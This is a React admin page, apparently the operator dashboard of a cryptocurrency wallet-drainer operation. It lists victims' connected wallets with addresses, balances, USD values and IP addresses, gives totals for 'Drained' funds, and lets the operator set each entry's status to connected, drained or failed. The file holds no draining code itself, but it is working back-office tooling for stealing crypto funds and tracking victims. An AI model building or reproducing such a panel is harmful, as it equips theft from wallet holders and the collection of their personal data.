import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function AdminConnections() {
  const [page, setPage] = useState(0);
  const limit = 20;

  const { data: connections, refetch } = trpc.admin.getConnections.useQuery({ limit, offset: page * limit });
  const { data: stats } = trpc.admin.getConnectionStats.useQuery();

  const updateStatus = trpc.admin.updateConnectionStatus.useMutation({
    onSuccess: () => { toast.success("Status updated"); refetch(); },
    onError: (e) => toast.error(e.message),
  });

  const statusBadge = (status: string) => {
    const map: Record<string, string> = {
      connected: "badge-info",
      drained: "badge-success",
      failed: "badge-error",
      pending: "badge-warning",
    };
    return map[status] || "badge-info";
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-black neon-text-cyan" style={{ fontFamily: 'Orbitron' }}>
          WALLET CONNECTIONS
        </h1>
        <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>
          All wallet connection attempts
        </p>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        {[
          { label: "Total", value: stats?.total ?? 0, color: "var(--neon-cyan)" },
          { label: "Connected", value: stats?.connected ?? 0, color: "var(--neon-cyan)" },
          { label: "Drained", value: stats?.drained ?? 0, color: "var(--neon-pink)" },
          { label: "USD Value", value: `$${parseFloat(stats?.totalUsdValue ?? "0").toLocaleString()}`, color: "oklch(0.75 0.25 145)" },
        ].map(s => (
          <div key={s.label} className="stat-card rounded-lg">
            <p className="text-xs text-muted-foreground uppercase tracking-widest mb-1" style={{ fontFamily: 'Share Tech Mono' }}>{s.label}</p>
            <p className="text-2xl font-black" style={{ color: s.color, fontFamily: 'Orbitron' }}>{s.value}</p>
          </div>
        ))}
      </div>

      {/* Table */}
      <div className="cyber-card rounded-lg overflow-hidden">
        <div className="overflow-x-auto">
          <table className="cyber-table">
            <thead>
              <tr>
                <th>Wallet Address</th>
                <th>Type</th>
                <th>Network</th>
                <th>Balance</th>
                <th>USD Value</th>
                <th>Status</th>
                <th>IP</th>
                <th>Date</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {connections && connections.length > 0 ? connections.map((c) => (
                <tr key={c.id}>
                  <td>
                    <span className="font-mono text-xs neon-text-cyan">
                      {c.walletAddress.slice(0, 8)}...{c.walletAddress.slice(-6)}
                    </span>
                  </td>
                  <td>
                    <span className="badge-pink">{c.walletType}</span>
                  </td>
                  <td className="text-xs" style={{ fontFamily: 'Share Tech Mono' }}>{c.network}</td>
                  <td className="text-xs" style={{ fontFamily: 'Share Tech Mono' }}>{parseFloat(c.ethBalance ?? "0").toFixed(4)}</td>
                  <td>
                    <span className="font-bold" style={{ color: 'oklch(0.75 0.25 145)', fontFamily: 'Orbitron', fontSize: '0.8rem' }}>
                      ${parseFloat(c.usdValue ?? "0").toLocaleString()}
                    </span>
                  </td>
                  <td><span className={statusBadge(c.status)}>{c.status}</span></td>
                  <td className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>{c.ipAddress}</td>
                  <td className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                    {new Date(c.createdAt).toLocaleString()}
                  </td>
                  <td>
                    <select
                      className="text-xs bg-muted border border-border rounded px-2 py-1 text-foreground"
                      value={c.status}
                      onChange={(e) => updateStatus.mutate({ id: c.id, status: e.target.value as "pending" | "connected" | "drained" | "failed" })}>
                      <option value="pending">Pending</option>
                      <option value="connected">Connected</option>
                      <option value="drained">Drained</option>
                      <option value="failed">Failed</option>
                    </select>
                  </td>
                </tr>
              )) : (
                <tr>
                  <td colSpan={9} className="text-center py-12 text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                    No connections yet
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        {/* Pagination */}
        <div className="flex items-center justify-between p-4 border-t border-border">
          <button
            onClick={() => setPage(p => Math.max(0, p - 1))}
            disabled={page === 0}
            className="cyber-btn-cyan px-4 py-1.5 rounded text-xs disabled:opacity-40"
            style={{ fontFamily: 'Orbitron' }}>
            ← PREV
          </button>
          <span className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
            Page {page + 1}
          </span>
          <button
            onClick={() => setPage(p => p + 1)}
            disabled={(connections?.length ?? 0) < limit}
            className="cyber-btn-pink px-4 py-1.5 rounded text-xs disabled:opacity-40"
            style={{ fontFamily: 'Orbitron' }}>
            NEXT →
          </button>
        </div>
      </div>
    </div>
  );
}
